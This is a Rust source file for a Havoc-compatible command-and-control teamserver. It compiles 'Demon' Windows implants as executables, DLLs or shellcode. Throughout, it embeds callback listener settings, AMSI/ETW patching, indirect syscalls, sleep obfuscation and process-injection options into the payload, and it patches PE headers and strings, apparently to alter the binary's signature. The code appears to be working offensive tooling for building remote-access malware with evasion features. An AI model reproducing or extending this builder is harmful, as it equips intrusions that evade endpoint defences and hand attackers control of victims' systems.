//! Havoc-compatible Demon payload compilation support.

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;

use red_cell_common::config::{BinaryConfig, DemonConfig, Profile};
use red_cell_common::operator::BuildPayloadRequestInfo;
use red_cell_common::{
    HttpListenerConfig, HttpListenerProxyConfig, ListenerConfig, ListenerProtocol,
};
use serde_json::{Map, Value};
use tempfile::TempDir;
use thiserror::Error;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;
use tokio::sync::mpsc;

/// Incremental console output emitted while building a Demon payload.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct BuildProgress {
    /// Havoc-style message severity label.
    pub level: String,
    /// Human-readable build output.
    pub message: String,
}

/// Compiled Demon payload bytes and metadata.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PayloadArtifact {
    /// Final payload bytes returned to the operator.
    pub bytes: Vec<u8>,
    /// Suggested output filename.
    pub file_name: String,
    /// Echoed output format string.
    pub format: String,
}

/// Errors returned by the Demon payload builder.
#[derive(Debug, Error)]
pub enum PayloadBuildError {
    /// A required compiler, source tree, or template file is unavailable.
    #[error("payload build tooling is unavailable: {message}")]
    ToolchainUnavailable { message: String },
    /// The request payload or selected listener is not supported.
    #[error("invalid payload build request: {message}")]
    InvalidRequest { message: String },
    /// JSON in the operator request could not be parsed.
    #[error("failed to parse payload build configuration: {0}")]
    InvalidConfigJson(#[from] serde_json::Error),
    /// An I/O operation failed while compiling or reading artifacts.
    #[error("payload build I/O failed: {0}")]
    Io(#[from] std::io::Error),
    /// A compiler process exited unsuccessfully.
    #[error("payload build command failed: {command}")]
    CommandFailed { command: String },
}

/// Teamserver service responsible for compiling Havoc-compatible Demon payloads.
#[derive(Clone, Debug)]
pub struct PayloadBuilderService {
    inner: Arc<PayloadBuilderInner>,
}

#[derive(Clone, Debug)]
struct PayloadBuilderInner {
    toolchain: Toolchain,
    source_root: PathBuf,
    shellcode_x64_template: PathBuf,
    shellcode_x86_template: PathBuf,
    default_demon: DemonConfig,
    binary_patch: Option<BinaryConfig>,
}

#[derive(Clone, Debug)]
struct Toolchain {
    compiler_x64: PathBuf,
    compiler_x86: PathBuf,
    nasm: PathBuf,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Architecture {
    X64,
    X86,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum OutputFormat {
    Exe,
    ServiceExe,
    Dll,
    ReflectiveDll,
    Shellcode,
}

impl Architecture {
    fn parse(value: &str) -> Result<Self, PayloadBuildError> {
        match value.trim().to_ascii_lowercase().as_str() {
            "x64" => Ok(Self::X64),
            "x86" => Ok(Self::X86),
            other => Err(PayloadBuildError::InvalidRequest {
                message: format!("unsupported architecture `{other}`"),
            }),
        }
    }

    const fn nasm_format(self) -> &'static str {
        match self {
            Self::X64 => "win64",
            Self::X86 => "win32",
        }
    }

    const fn suffix(self) -> &'static str {
        match self {
            Self::X64 => ".x64",
            Self::X86 => ".x86",
        }
    }
}

impl OutputFormat {
    fn parse(value: &str) -> Result<Self, PayloadBuildError> {
        match value.trim() {
            "Windows Exe" => Ok(Self::Exe),
            "Windows Service Exe" => Ok(Self::ServiceExe),
            "Windows Dll" => Ok(Self::Dll),
            "Windows Reflective Dll" => Ok(Self::ReflectiveDll),
            "Windows Shellcode" => Ok(Self::Shellcode),
            other => Err(PayloadBuildError::InvalidRequest {
                message: format!("unsupported output format `{other}`"),
            }),
        }
    }

    const fn file_extension(self) -> &'static str {
        match self {
            Self::Exe | Self::ServiceExe => ".exe",
            Self::Dll | Self::ReflectiveDll => ".dll",
            Self::Shellcode => ".bin",
        }
    }
}

impl PayloadBuilderService {
    /// Resolve the MinGW/NASM toolchain and Havoc payload source tree from `profile`.
    pub fn from_profile(profile: &Profile) -> Result<Self, PayloadBuildError> {
        let build = profile.teamserver.build.as_ref();
        let toolchain = Toolchain {
            compiler_x64: resolve_executable(
                build.and_then(|config| config.compiler64.as_deref()),
                "x86_64-w64-mingw32-gcc",
            )?,
            compiler_x86: resolve_executable(
                build.and_then(|config| config.compiler86.as_deref()),
                "i686-w64-mingw32-gcc",
            )?,
            nasm: resolve_executable(build.and_then(|config| config.nasm.as_deref()), "nasm")?,
        };

        let repo_root = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../..")
            .canonicalize()
            .map_err(|source| PayloadBuildError::ToolchainUnavailable {
                message: format!("failed to resolve repository root: {source}"),
            })?;
        let source_root = repo_root.join("src/Havoc/payloads/Demon");
        let shellcode_x64_template = repo_root.join("src/Havoc/payloads/Shellcode.x64.bin");
        let shellcode_x86_template = repo_root.join("src/Havoc/payloads/Shellcode.x86.bin");

        for required_path in [&source_root, &shellcode_x64_template, &shellcode_x86_template] {
            if !required_path.exists() {
                return Err(PayloadBuildError::ToolchainUnavailable {
                    message: format!(
                        "required Havoc payload asset missing: {}",
                        required_path.display()
                    ),
                });
            }
        }

        Ok(Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain,
                source_root,
                shellcode_x64_template,
                shellcode_x86_template,
                default_demon: profile.demon.clone(),
                binary_patch: profile.demon.binary.clone(),
            }),
        })
    }

    /// Compile a Demon payload for `listener` using the operator `request`.
    pub async fn build_payload<F>(
        &self,
        listener: &ListenerConfig,
        request: &BuildPayloadRequestInfo,
        mut progress: F,
    ) -> Result<PayloadArtifact, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        if request.agent_type.trim() != "Demon" {
            return Err(PayloadBuildError::InvalidRequest {
                message: format!("unsupported agent type `{}`", request.agent_type),
            });
        }

        let architecture = Architecture::parse(&request.arch)?;
        let format = OutputFormat::parse(&request.format)?;
        let config = merged_request_config(&request.config, &self.inner.default_demon)?;

        progress(BuildProgress { level: "Info".to_owned(), message: "starting build".to_owned() });

        let temp_dir = TempDir::new()?;
        let compiled = self
            .build_impl(listener, architecture, format, &config, temp_dir.path(), &mut progress)
            .await?;
        let file_name = format!("demon{}{}", architecture.suffix(), format.file_extension());

        Ok(PayloadArtifact { bytes: compiled, file_name, format: request.format.clone() })
    }

    #[doc(hidden)]
    pub fn disabled_for_tests() -> Self {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
        Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain: Toolchain {
                    compiler_x64: PathBuf::from("/nonexistent/x64-gcc"),
                    compiler_x86: PathBuf::from("/nonexistent/x86-gcc"),
                    nasm: PathBuf::from("/nonexistent/nasm"),
                },
                source_root: root.join("src/Havoc/payloads/Demon"),
                shellcode_x64_template: root.join("src/Havoc/payloads/Shellcode.x64.bin"),
                shellcode_x86_template: root.join("src/Havoc/payloads/Shellcode.x86.bin"),
                default_demon: DemonConfig {
                    sleep: None,
                    jitter: None,
                    indirect_syscall: false,
                    stack_duplication: false,
                    sleep_technique: None,
                    proxy_loading: None,
                    amsi_etw_patching: None,
                    injection: None,
                    dotnet_name_pipe: None,
                    binary: None,
                    trust_x_forwarded_for: false,
                    trusted_proxy_peers: Vec::new(),
                },
                binary_patch: None,
            }),
        }
    }

    #[cfg(test)]
    fn with_paths_for_tests(
        toolchain: Toolchain,
        source_root: PathBuf,
        shellcode_x64_template: PathBuf,
        shellcode_x86_template: PathBuf,
        default_demon: DemonConfig,
        binary_patch: Option<BinaryConfig>,
    ) -> Self {
        Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain,
                source_root,
                shellcode_x64_template,
                shellcode_x86_template,
                default_demon,
                binary_patch,
            }),
        }
    }

    async fn build_impl<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format: OutputFormat,
        config: &Map<String, Value>,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        if format == OutputFormat::Shellcode {
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: "compiling core dll".to_owned(),
            });
            let dll_bytes = self
                .compile_portable_executable(
                    listener,
                    architecture,
                    OutputFormat::Dll,
                    config,
                    compile_dir,
                    true,
                    progress,
                )
                .await?;
            let template = tokio::fs::read(match architecture {
                Architecture::X64 => &self.inner.shellcode_x64_template,
                Architecture::X86 => &self.inner.shellcode_x86_template,
            })
            .await?;

            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("compiled core dll [{} bytes]", dll_bytes.len()),
            });

            let mut shellcode = template;
            shellcode.extend_from_slice(&dll_bytes);
            progress(BuildProgress {
                level: "Info".to_owned(),
                message: format!("shellcode payload [{} bytes]", shellcode.len()),
            });
            progress(BuildProgress {
                level: "Good".to_owned(),
                message: "payload generated".to_owned(),
            });
            return Ok(shellcode);
        }

        let bytes = self
            .compile_portable_executable(
                listener,
                architecture,
                format,
                config,
                compile_dir,
                false,
                progress,
            )
            .await?;
        progress(BuildProgress {
            level: "Good".to_owned(),
            message: "payload generated".to_owned(),
        });
        Ok(bytes)
    }

    async fn compile_portable_executable<F>(
        &self,
        listener: &ListenerConfig,
        architecture: Architecture,
        format: OutputFormat,
        config: &Map<String, Value>,
        compile_dir: &Path,
        shellcode_define: bool,
        progress: &mut F,
    ) -> Result<Vec<u8>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let config_bytes = pack_config(listener, config)?;
        progress(BuildProgress {
            level: "Info".to_owned(),
            message: format!("config size [{} bytes]", config_bytes.len()),
        });

        let output_path =
            compile_dir.join(format!("demon{}{}", architecture.suffix(), format.file_extension()));
        let defines = build_defines(listener, config_bytes.as_slice(), shellcode_define)?;
        let object_files = self.compile_asm_objects(architecture, compile_dir, progress).await?;
        let compiler = match architecture {
            Architecture::X64 => &self.inner.toolchain.compiler_x64,
            Architecture::X86 => &self.inner.toolchain.compiler_x86,
        };

        let mut args: Vec<OsString> = Vec::new();
        args.extend(object_files.into_iter().map(|path| path.into_os_string()));
        for path in c_sources(&self.inner.source_root)? {
            args.push(
                path.strip_prefix(&self.inner.source_root)
                    .map_err(|source| PayloadBuildError::ToolchainUnavailable {
                        message: format!(
                            "failed to relativize source path {}: {source}",
                            path.display()
                        ),
                    })?
                    .as_os_str()
                    .to_os_string(),
            );
        }
        args.push(OsString::from("src/Demon.c"));
        args.push(OsString::from("-Iinclude"));
        args.extend(default_compiler_flags(format).into_iter().map(OsString::from));
        args.extend(defines.into_iter().map(|define| OsString::from(format!("-D{define}"))));
        args.extend(main_args(architecture, format).into_iter().map(OsString::from));
        args.push(OsString::from("-o"));
        args.push(output_path.as_os_str().to_os_string());

        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "compiling source".to_owned(),
        });
        run_command(compiler, &args, &self.inner.source_root, progress).await?;
        progress(BuildProgress {
            level: "Info".to_owned(),
            message: "finished compiling source".to_owned(),
        });

        let mut payload = tokio::fs::read(&output_path).await?;
        if let Some(binary_patch) = &self.inner.binary_patch {
            payload = patch_payload(payload, architecture, binary_patch)?;
        }
        Ok(payload)
    }

    async fn compile_asm_objects<F>(
        &self,
        architecture: Architecture,
        compile_dir: &Path,
        progress: &mut F,
    ) -> Result<Vec<PathBuf>, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        let mut objects = Vec::new();

        for source in asm_sources(&self.inner.source_root, architecture)? {
            let file_stem =
                source.file_stem().and_then(|value| value.to_str()).ok_or_else(|| {
                    PayloadBuildError::ToolchainUnavailable {
                        message: format!("invalid assembly source file name {}", source.display()),
                    }
                })?;
            let object_path = compile_dir.join(format!("{file_stem}.o"));
            let relative = source.strip_prefix(&self.inner.source_root).map_err(|error| {
                PayloadBuildError::ToolchainUnavailable {
                    message: format!(
                        "failed to relativize assembly source {}: {error}",
                        source.display()
                    ),
                }
            })?;

            run_command(
                &self.inner.toolchain.nasm,
                &[
                    OsString::from("-f"),
                    OsString::from(architecture.nasm_format()),
                    relative.as_os_str().to_os_string(),
                    OsString::from("-o"),
                    object_path.as_os_str().to_os_string(),
                ],
                &self.inner.source_root,
                progress,
            )
            .await?;
            objects.push(object_path);
        }

        Ok(objects)
    }
}

fn resolve_executable(
    configured: Option<&str>,
    fallback_name: &str,
) -> Result<PathBuf, PayloadBuildError> {
    let candidate = configured
        .map(PathBuf::from)
        .or_else(|| find_in_path(fallback_name))
        .ok_or_else(|| PayloadBuildError::ToolchainUnavailable {
            message: format!("required executable `{fallback_name}` was not found"),
        })?;

    if candidate.is_file() {
        candidate.canonicalize().map_err(|source| PayloadBuildError::ToolchainUnavailable {
            message: format!("failed to resolve {}: {source}", candidate.display()),
        })
    } else {
        Err(PayloadBuildError::ToolchainUnavailable {
            message: format!("executable does not exist: {}", candidate.display()),
        })
    }
}

fn find_in_path(program: &str) -> Option<PathBuf> {
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path).map(|dir| dir.join(program)).find(|candidate| candidate.is_file())
}

fn merged_request_config(
    input: &str,
    defaults: &DemonConfig,
) -> Result<Map<String, Value>, PayloadBuildError> {
    let mut config = match serde_json::from_str::<Value>(input)? {
        Value::Object(map) => map,
        _ => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "build config must be a JSON object".to_owned(),
            });
        }
    };

    insert_default_string(&mut config, "Sleep", defaults.sleep.map(|value| value.to_string()));
    insert_default_string(&mut config, "Jitter", defaults.jitter.map(|value| value.to_string()));
    insert_default_bool(&mut config, "Indirect Syscall", defaults.indirect_syscall);
    insert_default_bool(&mut config, "Stack Duplication", defaults.stack_duplication);
    insert_default_string(&mut config, "Sleep Technique", defaults.sleep_technique.clone());
    insert_default_string(&mut config, "Proxy Loading", defaults.proxy_loading.clone());
    insert_default_string(&mut config, "Amsi/Etw Patch", defaults.amsi_etw_patching.clone());
    if let Some(injection) = &defaults.injection {
        let entry =
            config.entry("Injection".to_owned()).or_insert_with(|| Value::Object(Map::new()));
        if let Value::Object(map) = entry {
            if !map.contains_key("Spawn64") {
                if let Some(spawn64) = &injection.spawn64 {
                    map.insert("Spawn64".to_owned(), Value::String(spawn64.clone()));
                }
            }
            if !map.contains_key("Spawn32") {
                if let Some(spawn32) = &injection.spawn32 {
                    map.insert("Spawn32".to_owned(), Value::String(spawn32.clone()));
                }
            }
        }
    }

    Ok(config)
}

fn insert_default_string(config: &mut Map<String, Value>, key: &str, value: Option<String>) {
    if !config.contains_key(key) {
        if let Some(value) = value {
            config.insert(key.to_owned(), Value::String(value));
        }
    }
}

fn insert_default_bool(config: &mut Map<String, Value>, key: &str, value: bool) {
    if value && !config.contains_key(key) {
        config.insert(key.to_owned(), Value::Bool(true));
    }
}

fn pack_config(
    listener: &ListenerConfig,
    config: &Map<String, Value>,
) -> Result<Vec<u8>, PayloadBuildError> {
    let sleep = required_u32(config, "Sleep")?;
    let jitter = required_u32(config, "Jitter")?;
    if jitter > 100 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "Jitter has to be between 0 and 100".to_owned(),
        });
    }

    let mut out = Vec::new();
    add_u32(&mut out, sleep);
    add_u32(&mut out, jitter);

    let injection = required_object(config, "Injection")?;
    add_u32(&mut out, injection_mode(injection, "Alloc")?);
    add_u32(&mut out, injection_mode(injection, "Execute")?);
    add_wstring(&mut out, required_string(injection, "Spawn64")?)?;
    add_wstring(&mut out, required_string(injection, "Spawn32")?)?;

    let sleep_technique = required_string(config, "Sleep Technique")?;
    let obfuscation = sleep_obfuscation_value(sleep_technique);
    add_u32(&mut out, obfuscation);
    add_u32(&mut out, sleep_jump_bypass(obfuscation, optional_string(config, "Sleep Jmp Gadget"))?);
    add_u32(
        &mut out,
        if obfuscation == 0 {
            0
        } else if optional_bool(config, "Stack Duplication").unwrap_or(false) {
            1
        } else {
            0
        },
    );
    add_u32(&mut out, proxy_loading_value(optional_string(config, "Proxy Loading")));
    add_u32(
        &mut out,
        if optional_bool(config, "Indirect Syscall").unwrap_or(false) { 1 } else { 0 },
    );
    add_u32(&mut out, amsi_patch_value(optional_string(config, "Amsi/Etw Patch")));

    match listener {
        ListenerConfig::Http(http) => pack_http_listener(&mut out, http)?,
        ListenerConfig::Smb(smb) => pack_smb_listener(&mut out, smb)?,
        ListenerConfig::External(_) => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "External listeners are not supported for Demon payload builds".to_owned(),
            });
        }
        ListenerConfig::Dns(_) => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "DNS listeners are not supported for Demon payload builds".to_owned(),
            });
        }
    }
    Ok(out)
}

fn pack_http_listener(
    out: &mut Vec<u8>,
    config: &HttpListenerConfig,
) -> Result<(), PayloadBuildError> {
    let port = config.port_conn.unwrap_or(config.port_bind);
    add_u64(out, parse_kill_date(config.kill_date.as_deref())?);
    add_u32(out, parse_working_hours(config.working_hours.as_deref())? as u32);

    let method = config.method.as_deref().unwrap_or("POST");
    if method.eq_ignore_ascii_case("GET") {
        return Err(PayloadBuildError::InvalidRequest {
            message: "GET method is not supported".to_owned(),
        });
    }
    add_wstring(out, "POST")?;
    add_u32(out, if config.host_rotation.eq_ignore_ascii_case("round-robin") { 0 } else { 1 });

    add_u32(
        out,
        u32::try_from(config.hosts.len()).map_err(|_| PayloadBuildError::InvalidRequest {
            message: "too many listener hosts configured".to_owned(),
        })?,
    );
    for host in &config.hosts {
        let (host_name, host_port) = host
            .rsplit_once(':')
            .and_then(|(host_name, port)| port.parse::<u16>().ok().map(|port| (host_name, port)))
            .unwrap_or((host.as_str(), port));
        add_wstring(out, host_name)?;
        add_u32(out, u32::from(host_port));
    }

    add_u32(out, if config.secure { 1 } else { 0 });
    add_wstring(out, config.user_agent.as_deref().unwrap_or_default())?;

    let mut headers = if config.headers.is_empty() {
        vec!["Content-type: */*".to_owned()]
    } else {
        config.headers.clone()
    };
    if let Some(host_header) = &config.host_header {
        headers.push(format!("Host: {host_header}"));
    }
    add_u32(
        out,
        u32::try_from(headers.len()).map_err(|_| PayloadBuildError::InvalidRequest {
            message: "too many HTTP headers configured".to_owned(),
        })?,
    );
    for header in headers {
        add_wstring(out, &header)?;
    }

    let uris = if config.uris.is_empty() { vec!["/".to_owned()] } else { config.uris.clone() };
    add_u32(
        out,
        u32::try_from(uris.len()).map_err(|_| PayloadBuildError::InvalidRequest {
            message: "too many URIs configured".to_owned(),
        })?,
    );
    for uri in uris {
        add_wstring(out, &uri)?;
    }

    match &config.proxy {
        Some(proxy) if proxy.enabled => {
            add_u32(out, 1);
            add_wstring(out, &proxy_url(proxy))?;
            add_wstring(out, proxy.username.as_deref().unwrap_or_default())?;
            add_wstring(out, proxy.password.as_deref().unwrap_or_default())?;
        }
        _ => add_u32(out, 0),
    }

    Ok(())
}

fn pack_smb_listener(
    out: &mut Vec<u8>,
    config: &red_cell_common::SmbListenerConfig,
) -> Result<(), PayloadBuildError> {
    add_wstring(out, &format!(r"\\.\pipe\{}", config.pipe_name))?;
    add_u64(out, parse_kill_date(config.kill_date.as_deref())?);
    add_u32(out, parse_working_hours(config.working_hours.as_deref())? as u32);
    Ok(())
}

fn build_defines(
    listener: &ListenerConfig,
    config_bytes: &[u8],
    shellcode_define: bool,
) -> Result<Vec<String>, PayloadBuildError> {
    let mut defines = vec![format!("CONFIG_BYTES={{{}}}", format_config_bytes(config_bytes))];
    match listener.protocol() {
        ListenerProtocol::Http => defines.push("TRANSPORT_HTTP".to_owned()),
        ListenerProtocol::Smb => defines.push("TRANSPORT_SMB".to_owned()),
        ListenerProtocol::External => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "External listeners are not supported for Demon payload builds".to_owned(),
            });
        }
        ListenerProtocol::Dns => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "DNS listeners are not supported for Demon payload builds".to_owned(),
            });
        }
    }
    if shellcode_define {
        defines.push("SHELLCODE".to_owned());
    }
    Ok(defines)
}

fn format_config_bytes(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("0x{byte:02x}")).collect::<Vec<_>>().join("\\,")
}

fn default_compiler_flags(format: OutputFormat) -> Vec<&'static str> {
    let mut flags = vec![
        "-Os",
        "-fno-asynchronous-unwind-tables",
        "-masm=intel",
        "-fno-ident",
        "-fpack-struct=8",
        "-falign-functions=1",
        "-s",
        "-ffunction-sections",
        "-fdata-sections",
        "-falign-jumps=1",
        "-w",
        "-falign-labels=1",
        "-fPIC",
    ];

    if format == OutputFormat::ServiceExe {
        flags.push("-mwindows");
        flags.push("-ladvapi32");
    } else {
        flags.push("-nostdlib");
        flags.push("-mwindows");
    }

    flags.push("-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections");
    flags
}

fn main_args(architecture: Architecture, format: OutputFormat) -> Vec<&'static str> {
    match format {
        OutputFormat::Exe => vec![
            "-D",
            "MAIN_THREADED",
            "-e",
            if architecture == Architecture::X64 { "WinMain" } else { "_WinMain" },
            "src/main/MainExe.c",
        ],
        OutputFormat::ServiceExe => vec![
            "-D",
            "MAIN_THREADED",
            "-D",
            "SVC_EXE",
            "-lntdll",
            "-e",
            if architecture == Architecture::X64 { "WinMain" } else { "_WinMain" },
            "src/main/MainSvc.c",
        ],
        OutputFormat::Dll | OutputFormat::ReflectiveDll => vec![
            "-shared",
            "-e",
            if architecture == Architecture::X64 { "DllMain" } else { "_DllMain" },
            "src/main/MainDll.c",
        ],
        OutputFormat::Shellcode => Vec::new(),
    }
}

async fn run_command<F>(
    program: &Path,
    args: &[OsString],
    cwd: &Path,
    progress: &mut F,
) -> Result<(), PayloadBuildError>
where
    F: FnMut(BuildProgress),
{
    let command_line = std::iter::once(program.display().to_string())
        .chain(args.iter().map(|arg| arg.to_string_lossy().into_owned()))
        .collect::<Vec<_>>()
        .join(" ");
    progress(BuildProgress { level: "Info".to_owned(), message: command_line.clone() });

    let mut command = Command::new(program);
    command.args(args).current_dir(cwd).stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = command.spawn()?;
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| PayloadBuildError::Io(std::io::Error::other("missing child stdout")))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| PayloadBuildError::Io(std::io::Error::other("missing child stderr")))?;
    let (sender, mut receiver) = mpsc::unbounded_channel();

    let stdout_task = tokio::spawn(read_stream(stdout, sender.clone()));
    let stderr_task = tokio::spawn(read_stream(stderr, sender));
    while let Some(line) = receiver.recv().await {
        if !line.trim().is_empty() {
            progress(BuildProgress { level: "Info".to_owned(), message: line });
        }
    }

    let status = child.wait().await?;
    stdout_task.await.map_err(|source| PayloadBuildError::Io(std::io::Error::other(source)))??;
    stderr_task.await.map_err(|source| PayloadBuildError::Io(std::io::Error::other(source)))??;

    if status.success() {
        Ok(())
    } else {
        Err(PayloadBuildError::CommandFailed { command: command_line })
    }
}

async fn read_stream(
    stream: impl tokio::io::AsyncRead + Unpin,
    sender: mpsc::UnboundedSender<String>,
) -> Result<(), std::io::Error> {
    let mut lines = BufReader::new(stream).lines();
    while let Some(line) = lines.next_line().await? {
        let _ = sender.send(line);
    }
    Ok(())
}

fn c_sources(source_root: &Path) -> Result<Vec<PathBuf>, PayloadBuildError> {
    let mut sources = Vec::new();
    for dir in ["src/core", "src/crypt", "src/inject", "src/asm"] {
        let mut entries = std::fs::read_dir(source_root.join(dir))?
            .collect::<Result<Vec<_>, _>>()?
            .into_iter()
            .map(|entry| entry.path())
            .filter(|path| path.extension().and_then(|value| value.to_str()) == Some("c"))
            .collect::<Vec<_>>();
        entries.sort();
        sources.extend(entries);
    }
    Ok(sources)
}

fn asm_sources(
    source_root: &Path,
    architecture: Architecture,
) -> Result<Vec<PathBuf>, PayloadBuildError> {
    let suffix = match architecture {
        Architecture::X64 => ".x64.asm",
        Architecture::X86 => ".x86.asm",
    };
    let mut entries = std::fs::read_dir(source_root.join("src/asm"))?
        .collect::<Result<Vec<_>, _>>()?
        .into_iter()
        .map(|entry| entry.path())
        .filter(|path| {
            path.file_name()
                .and_then(|value| value.to_str())
                .is_some_and(|name| name.contains(suffix))
        })
        .collect::<Vec<_>>();
    entries.sort();
    Ok(entries)
}

fn patch_payload(
    mut bytes: Vec<u8>,
    architecture: Architecture,
    binary_patch: &BinaryConfig,
) -> Result<Vec<u8>, PayloadBuildError> {
    let header = binary_patch.header.as_ref();
    let magic = match architecture {
        Architecture::X64 => header.and_then(|header| header.magic_mz_x64.as_deref()),
        Architecture::X86 => header.and_then(|header| header.magic_mz_x86.as_deref()),
    };
    if let Some(magic) = magic {
        let patch = magic.as_bytes();
        if patch.len() > bytes.len() {
            return Err(PayloadBuildError::InvalidRequest {
                message: "binary patch header is larger than the payload".to_owned(),
            });
        }
        bytes[..patch.len()].copy_from_slice(patch);
    }

    if let Some(header) = &binary_patch.header {
        if let Some(compile_time) = header.compile_time.as_deref() {
            let timestamp = parse_header_u32_field("CompileTime", compile_time)?;
            write_pe_file_header_timestamp(&mut bytes, timestamp)?;
        }

        let image_size = match architecture {
            Architecture::X64 => header.image_size_x64,
            Architecture::X86 => header.image_size_x86,
        };
        if let Some(image_size) = image_size {
            write_pe_optional_header_image_size(&mut bytes, image_size)?;
        }
    }

    let replacements = match architecture {
        Architecture::X64 => &binary_patch.replace_strings_x64,
        Architecture::X86 => &binary_patch.replace_strings_x86,
    };
    for (old, new) in replacements {
        let mut replacement = new.as_bytes().to_vec();
        if replacement.len() > old.len() {
            return Err(PayloadBuildError::InvalidRequest {
                message: format!("replacement value `{new}` is longer than search string `{old}`"),
            });
        }
        replacement.resize(old.len(), 0);
        bytes = replace_all(bytes, old.as_bytes(), &replacement);
    }

    Ok(bytes)
}

fn parse_header_u32_field(field_name: &str, value: &str) -> Result<u32, PayloadBuildError> {
    let trimmed = value.trim();
    let parsed =
        if let Some(hex) = trimmed.strip_prefix("0x").or_else(|| trimmed.strip_prefix("0X")) {
            u32::from_str_radix(hex, 16)
        } else {
            trimmed.parse::<u32>()
        };

    parsed.map_err(|_| PayloadBuildError::InvalidRequest {
        message: format!("{field_name} `{trimmed}` must be a valid u32 value"),
    })
}

fn pe_offsets(bytes: &[u8]) -> Result<(usize, usize), PayloadBuildError> {
    const DOS_HEADER_PE_POINTER_OFFSET: usize = 0x3C;
    const PE_SIGNATURE_SIZE: usize = 4;
    const FILE_HEADER_SIZE: usize = 20;

    if bytes.len() < DOS_HEADER_PE_POINTER_OFFSET + 4 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload is too small to contain a PE header".to_owned(),
        });
    }

    let pe_offset = u32::from_le_bytes(
        bytes[DOS_HEADER_PE_POINTER_OFFSET..DOS_HEADER_PE_POINTER_OFFSET + 4].try_into().map_err(
            |_| PayloadBuildError::InvalidRequest {
                message: "payload is too small to contain a PE header".to_owned(),
            },
        )?,
    );
    let pe_offset = usize::try_from(pe_offset).map_err(|_| PayloadBuildError::InvalidRequest {
        message: "payload PE header offset does not fit in memory".to_owned(),
    })?;

    if bytes.len() < pe_offset + PE_SIGNATURE_SIZE + FILE_HEADER_SIZE {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload PE header is truncated".to_owned(),
        });
    }

    if bytes[pe_offset..pe_offset + PE_SIGNATURE_SIZE] != *b"PE\0\0" {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload does not contain a valid PE signature".to_owned(),
        });
    }

    let optional_header_offset = pe_offset + PE_SIGNATURE_SIZE + FILE_HEADER_SIZE;
    if bytes.len() < optional_header_offset + 60 {
        return Err(PayloadBuildError::InvalidRequest {
            message: "payload PE optional header is truncated".to_owned(),
        });
    }

    Ok((pe_offset, optional_header_offset))
}

fn write_pe_file_header_timestamp(
    bytes: &mut [u8],
    timestamp: u32,
) -> Result<(), PayloadBuildError> {
    let (pe_offset, _) = pe_offsets(bytes)?;
    let timestamp_offset = pe_offset + 8;
    bytes[timestamp_offset..timestamp_offset + 4].copy_from_slice(&timestamp.to_le_bytes());
    Ok(())
}

fn write_pe_optional_header_image_size(
    bytes: &mut [u8],
    image_size: u32,
) -> Result<(), PayloadBuildError> {
    let (_, optional_header_offset) = pe_offsets(bytes)?;
    let image_size_offset = optional_header_offset + 56;
    bytes[image_size_offset..image_size_offset + 4].copy_from_slice(&image_size.to_le_bytes());
    Ok(())
}

fn replace_all(mut haystack: Vec<u8>, needle: &[u8], replacement: &[u8]) -> Vec<u8> {
    if needle.is_empty() {
        return haystack;
    }

    let mut offset = 0;
    while let Some(position) =
        haystack[offset..].windows(needle.len()).position(|window| window == needle)
    {
        let start = offset + position;
        haystack[start..start + needle.len()].copy_from_slice(replacement);
        offset = start + replacement.len();
    }
    haystack
}

fn required_object<'a>(
    config: &'a Map<String, Value>,
    key: &str,
) -> Result<&'a Map<String, Value>, PayloadBuildError> {
    config
        .get(key)
        .and_then(Value::as_object)
        .ok_or_else(|| PayloadBuildError::InvalidRequest { message: format!("{key} is undefined") })
}

fn required_string<'a>(
    config: &'a Map<String, Value>,
    key: &str,
) -> Result<&'a str, PayloadBuildError> {
    optional_string(config, key)
        .ok_or_else(|| PayloadBuildError::InvalidRequest { message: format!("{key} is undefined") })
}

fn optional_string<'a>(config: &'a Map<String, Value>, key: &str) -> Option<&'a str> {
    config
        .get(key)
        .and_then(|value| value.as_str())
        .map(str::trim)
        .filter(|value| !value.is_empty())
}

fn optional_bool(config: &Map<String, Value>, key: &str) -> Option<bool> {
    config.get(key).and_then(Value::as_bool)
}

fn required_u32(config: &Map<String, Value>, key: &str) -> Result<u32, PayloadBuildError> {
    match config.get(key) {
        Some(Value::String(value)) => value.trim().parse::<u32>().map_err(|_| {
            PayloadBuildError::InvalidRequest { message: format!("{key} must be a valid integer") }
        }),
        Some(Value::Number(value)) => {
            value.as_u64().and_then(|value| u32::try_from(value).ok()).ok_or_else(|| {
                PayloadBuildError::InvalidRequest { message: format!("{key} must fit in u32") }
            })
        }
        _ => Err(PayloadBuildError::InvalidRequest { message: format!("{key} is undefined") }),
    }
}

